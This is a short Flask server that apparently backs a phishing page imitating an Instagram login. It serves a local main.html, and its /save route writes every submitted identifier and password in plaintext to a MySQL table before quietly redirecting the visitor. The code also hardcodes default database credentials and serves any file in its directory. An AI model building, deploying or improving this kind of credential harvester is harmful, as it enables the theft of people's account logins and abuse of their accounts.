from flask import Flask, request, redirect, send_from_directory
import mysql.connector
import os

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def get_db():
    return mysql.connector.connect(
        host=os.environ.get('DB_HOST', '127.0.0.1'),
        port=int(os.environ.get('DB_PORT', 3306)),
        database=os.environ.get('DB_NAME', 'instagram_like'),
        user=os.environ.get('DB_USER', 'kesar'),
        password=os.environ.get('DB_PASS', '1234')
    )

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'main.html')

@app.route('/<path:filename>')
def static_files(filename):
    return send_from_directory(BASE_DIR, filename)

@app.route('/save', methods=['POST'])
def save():
    identifier = request.form.get('identifier', '')
    password   = request.form.get('password', '')

    db  = get_db()
    cur = db.cursor()
    cur.execute("INSERT INTO utilisateurs (identifier, mot_de_passe) VALUES (%s, %s)", (identifier, password))
    db.commit()
    cur.close()
    db.close()

    return redirect('/')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
